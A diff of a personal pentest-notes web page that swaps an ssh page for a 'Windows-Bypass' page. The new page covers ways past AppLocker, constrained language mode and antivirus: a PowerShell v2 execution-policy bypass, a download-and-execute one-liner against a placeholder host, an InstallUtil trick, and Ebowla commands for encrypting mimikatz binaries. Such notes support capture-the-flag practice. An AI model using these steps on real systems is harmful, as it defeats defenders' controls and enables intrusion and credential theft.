@@ -6,7 +6,7 @@
       <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 <meta name="revised" content="2019-04-18T01:16:25 EDT">
-<title>ssh :: DocDock Documentation</title>
+<title>Windows-Bypass :: DocDock Documentation</title>
 <link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
 <link href="/css/font-awesome.min.css" rel="stylesheet">
 <link href="/css/nucleus.css" rel="stylesheet">
@@ -25,7 +25,7 @@
 
     
   </head>
-  <body data-url="/tools/ssh/">
+  <body data-url="/concepts/bypass/">
     
       <header>
   <div class="logo">
@@ -73,11 +73,12 @@
   <aside>
     <ul class="menu">
 <a href="http://chickenpwny.github.io"><img src="/images/meme/home.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home" /></a>
-<li data-nav-id="/concepts/" class="dd-item haschildren
+<li data-nav-id="/concepts/" class="dd-item parent haschildren
         ">
     <div>
 
-        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/concepts/">Concept</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
 <li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
@@ -117,7 +118,7 @@
 </li>
     </ul>
 </li>
-<li data-nav-id="/concepts/bypass/" class="dd-item">
+<li data-nav-id="/concepts/bypass/" class="dd-item active">
     <div>
         <a href="/concepts/bypass/">
             Windows-Bypass
@@ -302,12 +303,11 @@
         <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
     </div>
 </li>
-<li data-nav-id="/tools/" class="dd-item parent haschildren
+<li data-nav-id="/tools/" class="dd-item haschildren
         ">
     <div>
 
-        <a href="/tools/">Tools</a>
-        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
 <li data-nav-id="/tools/bloodhound/" class="dd-item">
@@ -419,12 +419,11 @@
 </li>
     </ul>
 </li>
-<li data-nav-id="/tools/ssh/" class="dd-item parent active haschildren
+<li data-nav-id="/tools/ssh/" class="dd-item haschildren
         ">
     <div>
 
-        <a href="/tools/ssh/">ssh</a>
-        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
     </div>
     <ul>
 <li data-nav-id="/tools/ssh/port-forwarding/" class="dd-item
@@ -459,40 +458,18 @@
         <select onchange="javascript:location.href = this.value;">
           
     <option value="/concepts/" >
-   Concept</option>
+   Concept</option> 
+    <option value="/concepts/webapppentest/" >
+  - 
+   WebAppPenTests</option>
+      <option value="/concepts/bypass/"  selected>- Windows-Bypass</option>
+  
     <option value="/hackthebox/" >
    HackTheBox</option>
     <option value="/help/" >
    Network Manager Down</option>
     <option value="/tools/" >
-   Tools</option> 
-      <option value="/tools/bloodhound/" >- BloodHound Neo4j</option>
-      <option value="/tools/ftp/" >- FTP</option>
-    <option value="/tools/hydra/" >
-  - 
-   Hydra</option>
-      <option value="/tools/nmap/" >- Nmap</option>
-    <option value="/tools/portscanning/" >
-  - 
-   PortScannings</option>
-      <option value="/tools/smb/smb/" >- SMB</option>
-    <option value="/tools/snmpwalk/" >
-  - 
-   SNMPWalk</option>
-    <option value="/tools/webapp/" >
-  - 
-   WebApps</option>
-    <option value="/tools/ssh/"  selected>
-  - 
-   ssh</option> 
-    <option value="/tools/ssh/port-forwarding/" >
-  -- 
-   SHH Port Forwarding</option>
-    <option value="/tools/ssh/sshtunnling/" >
-  -- 
-   SSHuttle</option>
-  
-  
+   Tools</option>
 
 
 
@@ -515,38 +492,59 @@
       </div>
     
 
-    <h1>ssh</h1>
+    <h1>Windows-Bypass</h1>
     
     
     
+    <p>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions.</p>
 
-<p>SSH - secure shell <img src="https://chickenpwny.github.io/images/ssh/sshmask.jpg?height=100px" alt="sshmask" /></p>
+<p>If PowerShell version 2 is available you may be able to use this trick.</p>
 
-<p>Is a commonly used port/service. In fact, it is almost on every Linux Box on <a href="https://hackthebox.eu">hackthebox</a>. Network administrators use it to remotely managing Network Peripherals.  There are a couple CVE&rsquo;s out there for older version 7.3 Open Ssh is vulnerable to a user enumeration attack.</p>
-
-<p>SSH will commonly use sha-256 encryption to encrypt the traffic. The encryption Bit-Key is commonly set at 2048.</p>
-
-<p>Start Service</p>
-
-<p>Directories private keys might be in</p>
-
-<pre><code>/etc/ssh
-/root/.ssh
-
+<pre><code>PowerShell -Version 2 -ExecutionPolicy ByPass -command &quot;&quot;
 </code></pre>
 
-<p>vi /etc/ssh/sshd_conf
-PermitRootLogin yes
-service ssh start&lt;/c</p>
+<p>to check for constrained language mode.</p>
 
+<pre><code>$ExecutionContext.SessionState.LanguageMode
+</code></pre>
+
+<pre><code>$ExecutionContext.SessionState.LanguageMode = &quot;FullLanguage&quot;
+</code></pre>
+
+<pre><code>ie (New-Object Net.WebClient).DownloadString('http://changeme/powerview.ps1')
+</code></pre>
+
+<pre><code>[System.Console]::WriteLine(&quot;Hello&quot;)
+</code></pre>
+
+<pre><code>c:\windows\microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U .\meh.exe
+</code></pre>
+
+<p>Bypassing anti virus</p>
+
+<p>Using, Ebowla to bypass detection, why because anti virus looks for matching code to detect malicious software. You can use encryptions and decoding to evade detection. This for me is a last resort ill spend awhile trying to bypass restrictions. I may upload binaries.</p>
+
+<p>genetic.config please review 0xdf giddy write up on setting this up. we just need to change somethings and set the computer name as the target</p>
+
+<p>trying to get a payload to work was touchy my objective now is to encode Binary using Ebowla. I typically try to bring both copies a x86 and x64 binaries.</p>
+
+<p>note: locate mimi*.exe find the x64 version then copy it into Ebowla</p>
+
+<pre><code>python ebowla.py binary.exe genetic.config
+</code></pre>
+
+<pre><code>./build_x64_go.sh output/go_symmetric_binary_x64.exe.gp bianry.exe
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/bypass/nc-ebowla.PNG" alt="nc-ebowla" /></p>
 
 
     
     
         <div class="chevrons">
     <div id="navigation">
-<a class="nav nav-prev" href="/tools/webapp/wfuzz/" title="WFuzz"> <i class="fa fa-chevron-left"></i><label>WFuzz</label></a>
-    <a class="nav nav-next" href="/tools/ssh/port-forwarding/" title="SHH Port Forwarding" style="margin-right: 0px;"><label>SHH Port Forwarding</label><i class="fa fa-chevron-right"></i></a></div>
+<a class="nav nav-prev" href="/concepts/webapppentest/phptypejuggling/" title="PHP Typw Juggling"> <i class="fa fa-chevron-left"></i><label>PHP Typw Juggling</label></a>
+    <a class="nav nav-next" href="/hackthebox/" title="HackTheBox" style="margin-right: 0px;"><label>HackTheBox</label><i class="fa fa-chevron-right"></i></a></div>
   </div>
 
   </section>
@@ -563,7 +561,7 @@ service ssh start&lt;/c</p>
 
     
     <div class="github-link">
-      <a href="https://chickenpwny.github.ioTools/SSH/_index.md" target="blank"><i class="fa fa-code-fork"></i>
+      <a href="https://chickenpwny.github.ioConcepts/bypass.md" target="blank"><i class="fa fa-code-fork"></i>
         Improve this page</a>
     </div>
     
